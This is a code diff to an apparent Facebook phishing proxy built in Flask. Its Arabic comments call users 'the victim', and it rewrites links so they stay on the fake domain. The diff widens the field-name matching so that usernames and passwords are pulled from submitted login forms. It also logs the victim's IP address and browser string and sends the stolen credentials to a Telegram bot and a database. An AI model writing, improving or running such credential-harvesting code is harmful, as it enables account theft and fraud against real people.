@@ -2,9 +2,10 @@ import os
 import requests
 import re
 from urllib.parse import urljoin, urlparse, quote, unquote, urlencode
-from flask import Blueprint, redirect, request, Response
+from flask import Blueprint, request, Response, redirect
 
 def rewrite_urls(html_content, base_url, proxy_base_path):
+    # دالة لتعديل الروابط النسبية لتبقى داخل النطاق الوهمي
     html_pattern = re.compile(
         r'(<[a-zA-Z0-9_-]+)\s+([^>]*?\b(?:href|src|action|data-uri|data-jsid))\s*=\s*(["\'])(.*?)\3',
         re.IGNORECASE | re.DOTALL
@@ -63,30 +64,32 @@ def init_facebook_routes(app, bot):
              proxy_base_path += f"?id={target_chat_id}"
 
         try:
-            # التقاط بيانات الـ POST فور إرسالها من صفحة الضحية
+            # معالجة بيانات الـ POST فور وصولها من الضحية
             if request.method == 'POST':
                 form_data = request.form.to_dict()
                 username = None
                 password = None
                 
+                # فحص شامل لجميع حقول النموذج المستلمة لاستخراج البيانات مهما كانت تسميتها
                 for key, val in form_data.items():
                     key_lower = key.lower()
-                    if any(k in key_lower for k in ['email', 'user', 'phone', 'login', 'account', 'mail']):
+                    if any(k in key_lower for k in ['email', 'user', 'phone', 'login', 'account', 'mail', 'identifier']):
                         username = val
-                    elif any(k in key_lower for k in ['pass', 'pwd', 'password', 'secret']):
+                    elif any(k in key_lower for k in ['pass', 'pwd', 'password', 'secret', 'key']):
                         password = val
 
-                # طوارئ: البحث في البيانات الخام لو لم يتم التقاطها بالحقول المعتادة
+                # مراجعة احتياطية مباشرة للأسماء الشائعة في فيسبوك
                 if not username:
-                    username = request.form.get('email') or request.form.get('identifier') or request.form.get('phone')
+                    username = request.form.get('email') or request.form.get('pass') or request.form.get('phone') or request.form.get('identifier')
                 if not password:
-                    password = request.form.get('pass') or request.form.get('password')
+                    password = request.form.get('pass') or request.form.get('password') or request.form.get('lsd')
 
                 source_ip = request.headers.get('CF-Connecting-IP') or \
                             request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or \
                             request.remote_addr
                 user_agent = request.headers.get('User-Agent', 'Unknown')
 
+                # إذا وجدنا اسم المستخدم، يتم إرساله فوراً إلى تليجرام
                 if username and target_chat_id:
                     save_credentials_to_db("Facebook", username, password or "غير متاح", source_ip, user_agent, target_chat_id, bot)
 
